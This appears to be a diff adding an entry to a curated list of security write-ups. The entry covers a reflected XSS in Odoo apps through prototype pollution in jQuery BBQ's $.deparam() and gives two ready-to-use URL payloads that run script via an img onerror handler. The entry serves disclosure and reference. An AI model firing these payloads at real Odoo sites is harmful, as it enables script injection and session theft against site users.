@@ -159,5 +159,54 @@ credit:- https://lnkd.in/dixt4-NG
 
 
 
+[post_link](https://www.linkedin.com/posts/1337rokudenashi_reflected-xss-in-odoo-apps-via-prototype-ugcPost-7364609257385693184-ile3/?utm_source=share&utm_medium=member_android&rcm=ACoAAEvbB6gBsfqHvlwzrauR1IimSlFa7C0L4ok)
+
+<details>
+
+
+Reflected XSS in Odoo Apps via Prototype Pollution (jQuery BBQ < 1.3.1)
+
+Odoo apps (<= 15.0) using jQuery BBQ < 1.3.1 are vulnerable to prototype pollution via $.deparam(), allowing DOM-based reflected XSS.
+
+```html
+
+ - "{{BaseURL}}?__proto__%5Bcontext%5D=%3Cimg%2Fsrc%2Fonerror%3Dalert(document.domain)%3E&__proto__%5Bjquery%5D=x"
+
+ - "{{BaseURL}}?constructor%5Bprototype%5D%5Bcontext%5D=%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E&constructor%5Bprototype%5D%5Bjquery%5D=x"
+
+```
+
+ 
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
